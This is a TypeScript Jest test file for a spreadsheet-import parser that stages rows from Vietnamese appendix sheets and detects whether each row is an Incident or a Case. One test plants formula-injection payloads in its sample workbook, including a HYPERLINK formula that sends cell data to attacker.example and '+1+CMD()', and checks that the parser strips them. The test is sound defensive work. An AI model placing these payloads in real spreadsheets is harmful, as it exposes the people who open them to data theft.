import * as ExcelJS from 'exceljs';
import { XlsxParserService } from './xlsx-parser.service';

async function buildXlsx(
  builder: (wb: ExcelJS.Workbook) => void | Promise<void>,
): Promise<Buffer> {
  const wb = new ExcelJS.Workbook();
  await builder(wb);
  const ab = await wb.xlsx.writeBuffer();
  return Buffer.from(ab);
}

function makePrismaStub() {
  const stagingCalls: unknown[] = [];
  const caseCreate = jest.fn();
  const incidentCreate = jest.fn();
  return {
    stagingCalls,
    caseCreate,
    incidentCreate,
    prisma: {
      xlsxImportStaging: {
        createMany: jest.fn(async (args: unknown) => {
          stagingCalls.push(args);
          return { count: 1 };
        }),
      },
      case: { create: caseCreate, createMany: caseCreate, update: caseCreate, upsert: caseCreate },
      incident: {
        create: incidentCreate,
        createMany: incidentCreate,
        update: incidentCreate,
        upsert: incidentCreate,
      },
    } as any,
  };
}

describe('XlsxParserService', () => {
  it('strips formula payload from string cells into staging', async () => {
    const buf = await buildXlsx((wb) => {
      const ws = wb.addWorksheet('Phụ lục 01');
      ws.addRow(['STT', 'Tên', 'Địa chỉ']);
      ws.addRow([1, '=HYPERLINK("https://attacker.example?a="&A1,"Click")', 'Lê Lợi']);
      ws.addRow([2, '+1+CMD()', '@cmd']);
    });
    const { prisma, stagingCalls, caseCreate, incidentCreate } = makePrismaStub();
    const svc = new XlsxParserService(prisma);
    const result = await svc.parseToStaging(buf, 'log-1');

    expect(result.totalRowsStaged).toBe(2);
    expect(result.formulaStrippedCellCount).toBeGreaterThanOrEqual(3);
    expect(caseCreate).not.toHaveBeenCalled();
    expect(incidentCreate).not.toHaveBeenCalled();

    const rows = (stagingCalls[0] as { data: Array<{ payload: Record<string, unknown> }> }).data;
    const payloadValues = rows.flatMap((r) => Object.values(r.payload));
    for (const v of payloadValues) {
      if (typeof v === 'string') {
        expect(v.startsWith('=')).toBe(false);
        expect(v.startsWith('+')).toBe(false);
        expect(v.startsWith('-')).toBe(false);
        expect(v.startsWith('@')).toBe(false);
      }
    }
  });

  it('detects Phụ lục 01 sheet as Incident type', async () => {
    const buf = await buildXlsx((wb) => {
      const ws = wb.addWorksheet('Phụ lục 01');
      ws.addRow(['STT', 'Tên']);
      ws.addRow([1, 'A']);
    });
    const { prisma, stagingCalls } = makePrismaStub();
    const svc = new XlsxParserService(prisma);
    await svc.parseToStaging(buf, 'log-2');
    const rows = (stagingCalls[0] as { data: Array<{ detectedType: string | null }> }).data;
    expect(rows[0].detectedType).toBe('Incident');
  });

  it('detects Phụ lục 04 sheet as Case type', async () => {
    const buf = await buildXlsx((wb) => {
      const ws = wb.addWorksheet('Phụ lục 04 — Vụ án');
      ws.addRow(['STT', 'Mã VA']);
      ws.addRow([1, 'VA001']);
    });
    const { prisma, stagingCalls } = makePrismaStub();
    const svc = new XlsxParserService(prisma);
    await svc.parseToStaging(buf, 'log-3');
    const rows = (stagingCalls[0] as { data: Array<{ detectedType: string | null }> }).data;
    expect(rows[0].detectedType).toBe('Case');
  });

  it('returns null detectedType for unmappable sheets', async () => {
    const buf = await buildXlsx((wb) => {
      const ws = wb.addWorksheet('RandomSheet');
      ws.addRow(['STT', 'Foo']);
      ws.addRow([1, 'X']);
    });
    const { prisma, stagingCalls } = makePrismaStub();
    const svc = new XlsxParserService(prisma);
    await svc.parseToStaging(buf, 'log-4');
    const rows = (stagingCalls[0] as { data: Array<{ detectedType: string | null }> }).data;
    expect(rows[0].detectedType).toBeNull();
  });

  it('skips empty rows', async () => {
    const buf = await buildXlsx((wb) => {
      const ws = wb.addWorksheet('Phụ lục 01');
      ws.addRow(['STT', 'Tên']);
      ws.addRow([1, 'A']);
      ws.addRow([]); // empty
      ws.addRow([2, 'B']);
    });
    const { prisma } = makePrismaStub();
    const svc = new XlsxParserService(prisma);
    const result = await svc.parseToStaging(buf, 'log-5');
    expect(result.totalRowsStaged).toBe(2);
  });

  it('NEVER writes to case or incident tables (staging-only invariant)', async () => {
    const buf = await buildXlsx((wb) => {
      const ws01 = wb.addWorksheet('Phụ lục 01');
      ws01.addRow(['STT', 'Tên']);
      ws01.addRow([1, 'A']);
      const ws04 = wb.addWorksheet('Phụ lục 04');
      ws04.addRow(['STT', 'Mã VA']);
      ws04.addRow([1, 'VA-001']);
    });
    const { prisma, caseCreate, incidentCreate } = makePrismaStub();
    const svc = new XlsxParserService(prisma);
    await svc.parseToStaging(buf, 'log-6');
    expect(caseCreate).not.toHaveBeenCalled();
    expect(incidentCreate).not.toHaveBeenCalled();
  });
});
